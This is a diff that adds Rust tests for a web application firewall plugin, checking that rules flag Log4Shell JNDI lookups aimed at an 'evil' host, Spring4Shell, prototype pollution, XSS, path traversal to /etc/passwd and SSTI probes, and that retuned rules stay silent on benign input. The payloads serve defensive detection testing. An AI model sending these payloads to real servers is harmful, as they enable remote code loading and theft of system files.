@@ -863,3 +863,170 @@ async fn body_normalization_catches_escaped_payload_the_raw_scan_misses() {
         Some("CUSTOM-XSS-BODY")
     );
 }
+
+fn monitored(ctx: &RequestContext, rule_id: &str) -> bool {
+    ctx.metadata
+        .get("waf.rule_hits")
+        .is_some_and(|hits| hits.split(',').any(|hit| hit == rule_id))
+}
+
+#[tokio::test]
+async fn jndi_log4shell_detected_in_header_query_and_body() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    // Header delivery — the original rule pack never scanned header values
+    // for injection payloads, the primary Log4Shell channel.
+    let mut header_ctx = ctx("GET", "/");
+    header_ctx
+        .headers
+        .insert("user-agent".into(), "${jndi:ldap://evil/x}".into());
+    let _ = plugin.authorize(&mut header_ctx).await;
+    assert!(monitored(&header_ctx, "FE-JNDI-001-H"));
+
+    // Query delivery.
+    let mut query_ctx = ctx("GET", "/search");
+    query_ctx.set_raw_query_string("x=${jndi:rmi://evil/x}".into());
+    let _ = plugin.authorize(&mut query_ctx).await;
+    assert!(monitored(&query_ctx, "FE-JNDI-001-Q"));
+
+    // Body delivery.
+    let mut body_ctx = ctx("POST", "/submit");
+    body_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = body_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut body_ctx,
+            &headers,
+            br#"{"a":"${jndi:dns://evil/x}"}"#,
+        )
+        .await;
+    assert!(monitored(&body_ctx, "FE-JNDI-001-B"));
+}
+
+#[tokio::test]
+async fn prototype_pollution_and_spring4shell_detected_in_body() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    let mut proto_ctx = ctx("POST", "/submit");
+    proto_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = proto_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut proto_ctx,
+            &headers,
+            br#"{"__proto__":{"polluted":true}}"#,
+        )
+        .await;
+    assert!(monitored(&proto_ctx, "FE-PROTO-001"));
+
+    let mut spring_ctx = ctx("POST", "/submit");
+    spring_ctx.headers.insert(
+        "content-type".into(),
+        "application/x-www-form-urlencoded".into(),
+    );
+    let headers = spring_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut spring_ctx,
+            &headers,
+            b"class.module.classLoader.resources.context.parent.pipeline=x",
+        )
+        .await;
+    assert!(monitored(&spring_ctx, "FE-SPRING4SHELL-001-B"));
+}
+
+#[tokio::test]
+async fn xss_and_traversal_now_covered_in_request_body() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    let mut xss_ctx = ctx("POST", "/submit");
+    xss_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = xss_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut xss_ctx,
+            &headers,
+            br#"{"comment":"<script>alert(1)</script>"}"#,
+        )
+        .await;
+    assert!(monitored(&xss_ctx, "FE-XSS-001-B"));
+
+    let mut trav_ctx = ctx("POST", "/submit");
+    trav_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = trav_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut trav_ctx,
+            &headers,
+            br#"{"file":"../../etc/passwd"}"#,
+        )
+        .await;
+    assert!(monitored(&trav_ctx, "FE-PATHTRAV-001-B"));
+    assert!(monitored(&trav_ctx, "FE-LFI-001-B"));
+}
+
+#[tokio::test]
+async fn ssti_arithmetic_probe_fires_but_plain_template_does_not_at_default_paranoia() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    let mut probe_ctx = ctx("POST", "/submit");
+    probe_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = probe_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(&mut probe_ctx, &headers, br#"{"name":"{{7*7}}"}"#)
+        .await;
+    assert!(monitored(&probe_ctx, "FE-SSTI-002"));
+
+    // A plain template variable is not an attack. The broad `{{...}}` marker
+    // (FE-SSTI-001) is now gated behind paranoia_level >= 2, so nothing fires.
+    let mut plain_ctx = ctx("POST", "/submit");
+    plain_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = plain_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut plain_ctx,
+            &headers,
+            br#"{"template":"Hello {{ username }}"}"#,
+        )
+        .await;
+    assert!(!plain_ctx.metadata.contains_key("waf.rule_hits"));
+}
+
+#[tokio::test]
+async fn retuned_loud_rules_are_silent_at_default_paranoia() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    // Hex color `#fff` previously tripped the SQL-comment-token rule
+    // (FE-SQLI-004), now gated to paranoia_level >= 2.
+    let mut color_ctx = ctx("GET", "/search");
+    color_ctx.set_raw_query_string("color=#fff".into());
+    let _ = plugin.authorize(&mut color_ctx).await;
+    assert!(!monitored(&color_ctx, "FE-SQLI-004"));
+
+    // A bare URL in a query parameter previously tripped FE-RFI-001.
+    let mut url_ctx = ctx("GET", "/redirect");
+    url_ctx.set_raw_query_string("next=https://example.com/path".into());
+    let _ = plugin.authorize(&mut url_ctx).await;
+    assert!(!monitored(&url_ctx, "FE-RFI-001"));
+}
+
+#[tokio::test]
+async fn raised_paranoia_level_reactivates_retuned_rules() {
+    let plugin = Waf::new(&json!({ "paranoia_level": 2 })).unwrap();
+    let mut url_ctx = ctx("GET", "/redirect");
+    url_ctx.set_raw_query_string("next=https://example.com/path".into());
+    let _ = plugin.authorize(&mut url_ctx).await;
+    assert!(monitored(&url_ctx, "FE-RFI-001"));
+}
